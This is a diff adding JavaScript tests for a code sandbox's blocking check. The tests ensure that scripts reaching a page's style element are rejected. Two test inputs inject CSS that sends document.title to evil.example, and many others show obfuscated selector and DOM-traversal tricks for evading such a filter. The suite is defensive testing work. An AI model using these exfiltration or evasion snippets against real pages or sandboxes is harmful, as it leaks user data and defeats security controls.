@@ -1222,3 +1222,79 @@ describe('second audit (#48): the window as a value through event-handler proper
     }
   })
 })
+
+describe('second audit (#48): a style element that can still be reached', () => {
+  const SNIPPETS = [
+    `const sel = 'style'; document.querySelector(sel).textContent = '@imp' + 'ort "https://evil.example/?' + document.title + '"'`,
+    `document.querySelector(true ? 'style' : 'div').textContent = 'body{background:ur' + 'l(https://evil.example/?' + document.title + ')}'`,
+    `document.querySelector('st\\\\79le').textContent = ''`,
+    `document.querySelector('*|style').textContent = ''`,
+    `document.head.lastElementChild.textContent = ''`,
+    `[...document.getElementsByTagName('*')].find((e) => e.tagName === 'STYLE').append('')`,
+    `document.head.children[0].firstChild.nodeValue = ''`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks variants of the selector and of the traversal', () => {
+    for (const source of [
+      `const s = 'sty' + 'le'; document.querySelector(s)`,
+      `function pick(sel) { return document.querySelector(sel) } pick('style')`,
+      `document.querySelector(document.title)`,
+      `document.querySelectorAll(\`\${document.title}\`)`,
+      `document.querySelector('div').closest(document.title)`,
+      `document.querySelector('div').matches(document.title)`,
+      `document.getElementsByTagName(document.title)`,
+      `document.getElementsByTagName('*')`,
+      `document.getElementsByTagNameNS('*', '*')`,
+      `document.getElementsByTagNameNS('http://www.w3.org/1999/xhtml', document.title)`,
+      `document.querySelectorAll('*')`,
+      `document.querySelectorAll('head *')`,
+      `document.querySelectorAll('div, *')`,
+      `document.querySelector('ns|style')`,
+      `document.querySelector(':is(div, st\\\\79 le)')`,
+      `document.querySelector('STYLE')`,
+      `const h = document.head; h.lastElementChild.textContent = ''`,
+      `const h = document.head; h.firstChild.nodeValue = ''`,
+      `document.head.childNodes[0].data = ''`,
+      `document.head.firstElementChild.append('')`,
+      `document.documentElement.children[0].children[0].textContent = ''`,
+      `for (const c of document.head.children) { c.textContent = '' }`,
+      `Array.from(document.head.children).forEach((c) => { c.textContent = '' })`,
+      `const { lastElementChild: c } = document.head; c.textContent = ''`,
+      `const { children } = document.documentElement`,
+      `const { ...rest } = document.head`,
+      `document.getElementsByTagName('head')[0].lastElementChild.textContent = ''`,
+      `document.querySelector('head').lastChild.nodeValue = ''`,
+      `document.body.previousElementSibling.lastElementChild.textContent = ''`,
+      `document.head?.lastElementChild.textContent = ''`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('still passes selectors written out and a head that is only appended to', () => {
+    for (const source of [
+      `document.querySelector('.card > h2').textContent = 'x'`,
+      `const sel = '.card'; document.querySelector(sel)`,
+      `document.querySelectorAll('li:nth-child(' + 2 + ')')`,
+      `document.querySelectorAll('[style*="width"]')`,
+      `document.querySelectorAll('a[href^="/x"]')`,
+      `document.querySelectorAll('.script, .styled')`,
+      `document.querySelector('div').closest('section')`,
+      `document.querySelector('div').matches('.on')`,
+      `document.getElementsByTagName('a')`,
+      `document.head.append(document.createElement('div'))`,
+      `document.head.querySelector('meta[name="theme-color"]').content`,
+      `document.documentElement.classList.add('x')`,
+      `document.documentElement.dataset.theme = 'dark'`,
+      `document.querySelector('ul').children`,
+      `const el = document.querySelector('ul'); el.firstElementChild.textContent = 'x'`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
